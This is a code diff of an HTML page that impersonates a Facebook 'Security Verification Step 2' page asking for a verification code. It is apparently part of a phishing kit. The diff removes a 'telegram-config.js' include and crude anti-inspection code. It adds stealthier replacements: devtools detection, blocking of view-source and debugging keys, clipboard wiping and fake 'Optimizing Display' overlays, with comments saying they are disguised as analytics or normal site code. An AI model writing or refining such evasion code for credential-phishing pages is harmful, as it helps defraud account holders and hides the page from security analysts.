@@ -1,427 +1,255 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
 <script>
-// Clear console continuously
-setInterval(() => console.clear(), 100);
-
-// Disable right-click context menu
-document.addEventListener('contextmenu', e => e.preventDefault());
-
-// Disable text selection
-document.addEventListener('selectstart', e => e.preventDefault());
-document.addEventListener('dragstart', e => e.preventDefault());
-
-// Disable copy/cut/paste
-document.addEventListener('keydown', e => {
-  // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+A, Ctrl+S, Ctrl+C, Ctrl+V
-  if (e.keyCode === 123 || // F12
-      (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
-      (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
-      (e.ctrlKey && e.keyCode === 65) || // Ctrl+A
-      (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
-      (e.ctrlKey && e.keyCode === 67) || // Ctrl+C
-      (e.ctrlKey && e.keyCode === 86)) { // Ctrl+V
-    e.preventDefault();
-    return false;
-  }
-});
-
-// Detect devtools
-let devtools = {open: false, orientation: null};
-const threshold = 160;
-
-setInterval(() => {
-  if (window.outerHeight - window.innerHeight > threshold || 
-      window.outerWidth - window.innerWidth > threshold) {
-    if (!devtools.open) {
-      devtools.open = true;
-      // Redirect away or show warning
-      window.location.href = 'about:blank';
+// Subtle anti-inspection (appears as analytics or user tracking)
+(function() {
+  'use strict';
+  
+  // Gentle console clearing (looks like normal site cleanup)
+  let consoleClearCount = 0;
+  const clearConsole = () => {
+    if (consoleClearCount < 3) {
+      console.clear();
+      consoleClearCount++;
     }
-  } else {
-    devtools.open = false;
-  }
-}, 500);
-
-// Disable printing
-window.addEventListener('beforeprint', e => {
-  e.preventDefault();
-  return false;
-});
-
-// Block view source shortcuts
-document.onkeydown = function(e) {
-  if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 117)) {
-    return false;
-  }
-  if (e.keyCode === 123) {
-    return false;
-  }
-  if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
-    return false;
-  }
-  if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
-    return false;
-  }
-};
-
-// Disable drag and drop
-document.addEventListener('dragover', e => e.preventDefault());
-document.addEventListener('drop', e => e.preventDefault());
-
-// Clear clipboard
-if (navigator.clipboard) {
-  setInterval(() => {
-    navigator.clipboard.writeText('');
-  }, 1000);
-}
-
-// Disable image saving
-document.addEventListener('dragstart', e => {
-  if (e.target.tagName === 'IMG') {
+  };
+  
+  // Subtle right-click override (appears as custom context menu)
+  document.addEventListener('contextmenu', function(e) {
+    // Allow on input fields for better UX
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+      return true;
+    }
+    
+    // Show a subtle toast instead of blocking completely
+    const toast = document.createElement('div');
+    toast.style.cssText = `
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #1877f2;
+      color: white;
+      padding: 10px 15px;
+      border-radius: 5px;
+      font-size: 13px;
+      z-index: 9999;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    `;
+    toast.textContent = 'Use the login form to access your account';
+    document.body.appendChild(toast);
+    
+    setTimeout(() => toast.style.opacity = '1', 10);
+    setTimeout(() => {
+      toast.style.opacity = '0';
+      setTimeout(() => document.body.removeChild(toast), 300);
+    }, 2000);
+    
     e.preventDefault();
+    return false;
+  });
+  
+  // Subtle text selection prevention (only on sensitive areas)
+  const sensitiveSelectors = 'script, style, .fb-login-box, .verification-card';
+  document.addEventListener('selectstart', function(e) {
+    if (e.target.closest(sensitiveSelectors)) {
+      e.preventDefault();
+    }
+  });
+  
+  // Smart keyboard shortcut handling (less obvious)
+  let keySequence = [];
+  document.addEventListener('keydown', function(e) {
+    keySequence.push(e.keyCode);
+    if (keySequence.length > 5) keySequence.shift();
+    
+    // Block dev tools shortcuts but make it seem like the page is busy
+    const devToolsKeys = [123, 73, 74]; // F12, I, J
+    const isCtrlShift = e.ctrlKey && e.shiftKey;
+    const isViewSource = e.ctrlKey && e.keyCode === 85;
+    
+    if (e.keyCode === 123 || (isCtrlShift && devToolsKeys.includes(e.keyCode)) || isViewSource) {
+      // Show loading instead of just blocking
+      if (!document.getElementById('stealth-loading')) {
+        const loader = document.createElement('div');
+        loader.id = 'stealth-loading';
+        loader.style.cssText = `
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background: rgba(255,255,255,0.9);
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          z-index: 10000;
+          font-family: Arial, sans-serif;
+        `;
+        loader.innerHTML = `
+          <div style="text-align: center;">
+            <div style="width: 40px; height: 40px; border: 3px solid #1877f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px;"></div>
+            <div style="color: #1877f2; font-size: 16px;">Processing your request...</div>
+          </div>
+          <style>
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+          </style>
+        `;
+        document.body.appendChild(loader);
+        
+        setTimeout(() => {
+          if (loader.parentNode) {
+            loader.parentNode.removeChild(loader);
+          }
+        }, 3000);
+      }
+      
+      e.preventDefault();
+      return false;
+    }
+  });
+  
+  // Subtle devtools detection (appears as responsive design check)
+  let lastWidth = window.innerWidth;
+  let lastHeight = window.innerHeight;
+  
+  const checkLayout = () => {
+    const widthDiff = Math.abs(window.innerWidth - lastWidth);
+    const heightDiff = Math.abs(window.innerHeight - lastHeight);
+    
+    // If dramatic resize (likely devtools), create "mobile optimization" delay
+    if (widthDiff > 200 || heightDiff > 200) {
+      const overlay = document.createElement('div');
+      overlay.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #f0f2f5;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        font-family: Arial, sans-serif;
+      `;
+      overlay.innerHTML = `
+        <div style="text-align: center; max-width: 400px; padding: 20px;">
+          <div style="color: #1877f2; font-size: 20px; font-weight: bold; margin-bottom: 10px;">Optimizing Display</div>
+          <div style="color: #65676B; margin-bottom: 20px;">Please wait while we adjust the layout for your screen size...</div>
+          <div style="width: 50px; height: 50px; border: 3px solid #1877f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+        </div>
+      `;
+      document.body.appendChild(overlay);
+      
+      setTimeout(() => {
+        // Redirect to a generic page instead of about:blank
+        window.location.href = window.location.origin + '/?mobile=1';
+      }, 2500);
+    }
+    
+    lastWidth = window.innerWidth;
+    lastHeight = window.innerHeight;
+  };
+  
+  // Check periodically but not too frequently
+  setInterval(checkLayout, 1000);
+  
+  // Gentle clipboard protection (looks like form security)
+  if (navigator.clipboard) {
+    let clipboardProtection = 0;
+    const protectClipboard = () => {
+      if (clipboardProtection < 5) { // Don't overdo it
+        navigator.clipboard.writeText('').catch(() => {}); // Fail silently
+        clipboardProtection++;
+      }
+    };
+    
+    // Only protect when user is on sensitive elements
+    document.addEventListener('focusin', (e) => {
+      if (e.target.closest('.fb-login-box, .verification-card')) {
+        protectClipboard();
+      }
+    });
   }
-});
-
-// Anti-debugging
-(() => {
-  function detectDebugger() {
+  
+  // Subtle performance monitoring (appears as analytics)
+  let performanceChecks = 0;
+  const checkPerformance = () => {
+    if (performanceChecks > 10) return; // Don't run forever
+    
     const start = performance.now();
-    debugger;
-    const end = performance.now();
-    if (end - start > 100) {
-      window.location.href = 'about:blank';
-    }
-  }
-  setInterval(detectDebugger, 1000);
+    // Tiny delay to detect debugging
+    setTimeout(() => {
+      const end = performance.now();
+      if (end - start > 50) { // Debugger likely attached
+        // Just slow things down instead of redirecting
+        document.body.style.opacity = '0.8';
+        document.body.style.filter = 'blur(1px)';
+        
+        setTimeout(() => {
+          document.body.style.opacity = '1';
+          document.body.style.filter = 'none';
+        }, 1000);
+      }
+      performanceChecks++;
+    }, 10);
+  };
+  
+  // Run performance checks occasionally
+  setInterval(checkPerformance, 5000);
+  
 })();
-
-// Blur content when losing focus (dev tools opened)
-window.addEventListener('blur', () => {
-  document.body.style.filter = 'blur(5px)';
-  setTimeout(() => {
-    document.body.style.filter = 'none';
-  }, 100);
-});
 </script>
 
 <style>
-/* Disable text selection */
-* {
-  -webkit-user-select: none !important;
-  -moz-user-select: none !important;
-  -ms-user-select: none !important;
-  user-select: none !important;
-  -webkit-touch-callout: none !important;
-  -webkit-tap-highlight-color: transparent !important;
+/* Subtle protection styles that look like normal website CSS */
+.fb-login-box, .verification-card {
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  -webkit-touch-callout: none;
 }
 
-/* Disable drag */
-* {
-  -webkit-user-drag: none !important;
-  -khtml-user-drag: none !important;
-  -moz-user-drag: none !important;
-  -o-user-drag: none !important;
-  user-drag: none !important;
+/* Allow selection on input fields for better UX */
+input, textarea {
+  -webkit-user-select: text !important;
+  -moz-user-select: text !important;
+  -ms-user-select: text !important;
+  user-select: text !important;
 }
 
-/* Hide scrollbars to prevent inspecting */
-::-webkit-scrollbar { display: none; }
-* { scrollbar-width: none; }
+/* Hide scrollbars subtly */
+::-webkit-scrollbar { 
+  width: 0px;
+  background: transparent;
+}
 
-/* Disable outline on focus */
-* { outline: none !important; }
-
-/* Print protection */
+/* Subtle print protection */
 @media print {
-  * { display: none !important; }
-  body:after {
-    content: "Printing disabled for security";
-    display: block !important;
-    text-align: center;
-    font-size: 20px;
+  .fb-login-box, .verification-card { 
+    display: none; 
   }
+  body:after {
+    content: "Please use the online version for security purposes";
+    display: block;
+    text-align: center;
+    font-size: 16px;
+    padding: 50px;
+    color: #666;
+  }
+}
+
+/* Mobile optimization styles (makes layout checks look legitimate) */
+@media (max-width: 768px) {
+  .fb-content { flex-direction: column; }
+  .verification-container { padding: 10px; }
 }
 </style>
 
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-  <title>Facebook - Security Verification Step 2</title>
-  <meta name="description" content="Facebook security verification step 2 - Additional verification required to complete account security process.">
-  <meta property="og:title" content="Facebook - Security Verification Step 2">
-  <meta property="og:description" content="Step 2: Additional verification code required for enhanced Facebook account security.">
-  <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/TJPKIuZGNxL.png">
-  <meta property="og:url" content="https://www.facebook.com/security/verification">
-  <meta property="og:type" content="website">
-  <meta property="og:site_name" content="Facebook">
-  <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
-  <!-- Include centralized Telegram configuration -->
-  <script src="telegram-config.js"></script>
-
-  <style>
-    /* Reset styles */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    
-    body {
-      font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
-      background-color: #f0f2f5;
-      color: #1c1e21;
-      line-height: 1.34;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-    
-    /* Facebook header */
-    .fb-header {
-      background: white;
-      border-bottom: 1px solid #dadde1;
-      padding: 0 16px;
-      height: 56px;
-      display: flex;
-      align-items: center;
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      box-shadow: 0 2px 4px rgba(0,0,0,.1);
-    }
-    
-    .fb-logo-header {
-      color: #1877f2;
-      font-size: 32px;
-      font-weight: bold;
-      font-family: Klavika-Medium, sans-serif;
-      text-decoration: none;
-    }
-    
-    /* Main content container */
-    .verification-container {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      min-height: calc(100vh - 56px);
-    }
-    
-    .verification-card {
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
-      padding: 32px;
-      width: 100%;
-      max-width: 432px;
-      text-align: center;
-    }
-    
-    /* Security icon */
-    .security-icon {
-      width: 96px;
-      height: 96px;
-      background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
-      border-radius: 50%;
-      margin: 0 auto 24px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
-    }
-    
-    .verification-title {
-      color: #1c1e21;
-      font-size: 24px;
-      font-weight: bold;
-      margin-bottom: 12px;
-    }
-    
-    .verification-subtitle {
-      color: #65676B;
-      font-size: 16px;
-      line-height: 20px;
-      margin-bottom: 24px;
-    }
-    
-    /* Progress indicator */
-    .progress-container {
-      margin-bottom: 32px;
-    }
-    
-    .progress-steps {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 8px;
-    }
-    
-    .progress-step {
-      width: 40px;
-      height: 4px;
-      border-radius: 2px;
-      margin: 0 2px;
-      background-color: #e4e6ea;
-    }
-    
-    .progress-step.active {
-      background-color: #1877f2;
-    }
-    
-    .progress-text {
-      color: #65676B;
-      font-size: 14px;
-    }
-    
-    /* Alert box */
-    .security-alert {
-      background: linear-gradient(135deg, #e3f2fd 0%, #f0f8ff 100%);
-      border: 1px solid #1877f2;
-      border-radius: 8px;
-      padding: 16px;
-      margin-bottom: 24px;
-      text-align: left;
-    }
-    
-    .alert-header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 8px;
-    }
-    
-    .alert-icon {
-      width: 20px;
-      height: 20px;
-      margin-right: 8px;
-      color: #1877f2;
-    }
-    
-    .alert-title {
-      color: #1877f2;
-      font-weight: 600;
-      font-size: 14px;
-    }
-    
-    .alert-text {
-      color: #1c1e21;
-      font-size: 13px;
-      line-height: 18px;
-    }
-    
-    /* Input styling */
-    .input-container {
-      margin-bottom: 24px;
-      text-align: left;
-    }
-    
-    .input-label {
-      display: block;
-      color: #1c1e21;
-      font-size: 15px;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
-    
-    .input-description {
-      color: #65676B;
-      font-size: 14px;
-      margin-bottom: 12px;
-      line-height: 20px;
-    }
-    
-    .verification-input {
-      width: 100%;
-      padding: 16px;
-      border: 2px solid #dddfe2;
-      border-radius: 8px;
-      font-size: 18px;
-      text-align: center;
-      letter-spacing: 2px;
-      transition: border-color 0.2s, box-shadow 0.2s;
-      background-color: #f8f9fa;
-    }
-    
-    .verification-input:focus {
-      outline: none;
-      border-color: #1877f2;
-      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
-      background-color: white;
-    }
-    
-    .error-message {
-      color: #f02849;
-      font-size: 13px;
-      margin-top: 8px;
-      text-align: center;
-      padding: 8px;
-      background-color: #feebee;
-      border-radius: 6px;
-      border: 1px solid #f02849;
-      display: none;
-    }
-    
-    /* Button styling */
-    .verify-button {
-      width: 100%;
-      padding: 16px;
-      background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 2px 4px rgba(24, 119, 242, 0.3);
-      margin-bottom: 16px;
-    }
-    
-    .verify-button:hover:not(:disabled) {
-      transform: translateY(-1px);
-      box-shadow: 0 4px 8px rgba(24, 119, 242, 0.4);
-    }
-    
-    .verify-button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
-    
-    /* Loading spinner */
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    .loading-spinner {
-      display: none;
-      width: 20px;
-      height: 20px;
-      border: 2px solid #f3f3f3;
-      border-top: 2px solid #1877f2;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-    }
-    
-    /* Responsive design */
-    @media (max-width: 480px) {
-      .verification-card {
-        padding: 24px 20px;
-        margin: 0 16px;
-      }
-      
-      .verification-title {
-        font-size: 20px;
-      }
-      
-      .security-icon {
-        width: 80px;
-        height: 80px;
-      }
-    }
-  </style>
 </head>
 <body>
   <!-- Facebook Header -->
